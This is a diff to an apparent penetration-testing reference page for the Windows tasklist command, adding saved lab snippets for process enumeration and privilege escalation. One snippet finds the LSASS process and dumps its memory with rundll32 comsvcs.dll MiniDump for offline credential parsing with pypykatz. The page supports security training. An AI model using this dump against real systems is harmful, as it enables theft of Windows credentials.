@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=tasklist) · [All tools](/index)
+
 ## Processes with details
 
 **Windows — cmd.exe**
@@ -41,8 +43,86 @@ Replace PID_NUMBER with the numeric PID.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=tasklist)
+## Notebook recipes
 
-## Learning and original examples
+6 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+<AccordionGroup>
+
+<Accordion title="Background">
+
+### Background
+
+**Kerberos Double Hop**
+
+```powershell
+[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
+wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
+                             0:00:03 N/A
+tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm
+                             0:00:00 N/A
+conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
+                             0:00:00 N/A
+```
+
+</Accordion>
+
+<Accordion title="Create the memory dump">
+
+### Create the memory dump
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```cmd
+tasklist /svc | findstr lsass          :: cmd: find the PID
+```
+
+</Accordion>
+
+<Accordion title="B. SeDebugPrivilege → read any process memory">
+
+### B. SeDebugPrivilege → read any process memory
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: dump lsass via the signed comsvcs.dll (lives on every Windows box)
+tasklist /fi "imagename eq lsass.exe"                 :: get the PID
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\l.dmp full
+:: then parse offline on Kali:  pypykatz lsa minidump l.dmp
+```
+
+</Accordion>
+
+<Accordion title="EoP - Processes Enumeration and Tasks">
+
+### EoP - Processes Enumeration and Tasks
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+tasklist /v
+net start
+sc query
+Get-Service
+Get-Process
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+tasklist /v /fi "username eq system"
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net start
+wmic service list brief
+tasklist /SVC
+```
+
+</Accordion>
+
+</AccordionGroup>
